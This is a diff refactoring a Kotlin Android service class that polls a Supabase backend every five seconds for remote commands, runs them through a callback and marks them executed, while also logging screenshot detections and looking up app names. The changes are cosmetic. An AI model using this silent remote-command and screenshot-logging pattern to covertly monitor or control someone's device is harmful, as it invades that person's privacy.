@@ -10,6 +10,7 @@ class SupabaseSync(private val service: android.app.Service) {
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var polling = false
+
     private val supabaseUrl = BuildConfig.SUPABASE_URL
     private val anonKey = BuildConfig.SUPABASE_ANON_KEY
 
@@ -41,9 +42,10 @@ class SupabaseSync(private val service: android.app.Service) {
     fun logScreenshot() {
         scope.launch {
             try {
-                postToSupabase("screenshot_log", JSONObject().apply {
+                val body = JSONObject().apply {
                     put("file_path", "detected_by_fileobserver")
-                })
+                }
+                postToSupabase("screenshot_log", body)
             } catch (_: Exception) {}
         }
     }
@@ -60,18 +62,22 @@ class SupabaseSync(private val service: android.app.Service) {
                     conn.setRequestProperty("Authorization", "Bearer $anonKey")
                     val response = conn.inputStream.bufferedReader().readText()
                     conn.disconnect()
+
                     if (response.length > 2) {
                         val arr = org.json.JSONArray(response)
                         if (arr.length() > 0) {
                             val cmd = arr.getJSONObject(0)
                             val command = cmd.getString("command")
                             val cmdId = cmd.getLong("id")
+
                             callback(command)
+
+                            // Mark as executed
                             markCommandExecuted(cmdId)
                         }
                     }
                 } catch (_: Exception) {}
-                delay(5000)
+                delay(5000) // Poll every 5 seconds
             }
         }
     }
@@ -86,7 +92,8 @@ class SupabaseSync(private val service: android.app.Service) {
             conn.setRequestProperty("Authorization", "Bearer $anonKey")
             conn.setRequestProperty("Prefer", "return=minimal")
             conn.doOutput = true
-            conn.outputStream.use { it.write(JSONObject().apply { put("executed", true) }.toString().toByteArray()) }
+            val patchBody = JSONObject().apply { put("executed", true) }
+            conn.outputStream.use { it.write(patchBody.toString().toByteArray()) }
             conn.responseCode
             conn.disconnect()
         } catch (_: Exception) {}
@@ -113,7 +120,9 @@ class SupabaseSync(private val service: android.app.Service) {
             val pm = service.packageManager
             val info = pm.getApplicationInfo(packageName, 0)
             pm.getApplicationLabel(info).toString()
-        } catch (_: Exception) { packageName }
+        } catch (_: Exception) {
+            packageName
+        }
     }
 
     fun stopPolling() {
